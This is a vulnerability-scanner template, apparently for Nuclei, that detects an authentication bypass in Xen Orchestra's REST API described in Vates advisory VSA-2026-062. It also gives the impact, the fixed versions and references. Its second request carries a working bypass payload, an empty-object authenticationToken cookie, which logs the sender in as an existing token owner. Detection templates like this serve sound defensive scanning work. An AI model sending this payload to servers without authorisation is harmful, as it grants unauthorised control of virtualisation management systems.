id: vates-sa-2026-062

info:
  name: Xen Orchestra - Empty-Object Authentication Token Bypass
  author: alex700
  severity: critical
  description: |
    Detects the Xen Orchestra REST authentication bypass described in
    VSA-2026-062. The check compares an anonymous current-user request with
    the same GET request carrying an empty-object authentication token.
    A vulnerable server redirects the latter to a user record because it
    authenticates as the owner of an existing, unexpired token. The check
    does not follow that redirect. Instances without such a token may not
    be detected. Successful authentication updates token last-use metadata
    on the target.
  impact: |
    An unauthenticated attacker may gain the privileges of an existing token
    owner. Vates reports that this can lead to Xen Orchestra compromise.
  remediation: |
    Upgrade Xen Orchestra to 6.9.2 or later on the stable channel, or 6.10.1
    or later on the latest channel, following Vates' advisory.
  reference:
    - https://docs.vates.tech/security-advisories/advisories/2026/vates-sa-2026-062/
    - https://github.com/vatesfr/xen-orchestra/pull/10748
  metadata:
    verified: true
    max-request: 2
    vendor: vates
    product: xen_orchestra
  tags: vates,xen-orchestra,auth-bypass,vsa2026

http:
  - raw:
      - |
        GET /rest/v0/users/me HTTP/1.1
        Host: {{Hostname}}

      - |
        GET /rest/v0/users/me HTTP/1.1
        Host: {{Hostname}}
        Cookie: authenticationToken=j:%7B%7D

    matchers:
      - type: dsl
        dsl:
          - "status_code_1 == 401 && status_code_2 == 307"
          - "regex('^/rest/v0/users/[0-9a-f]{8}(-[0-9a-f]{4}){3}-[0-9a-f]{12}$', location_2)"
        condition: and
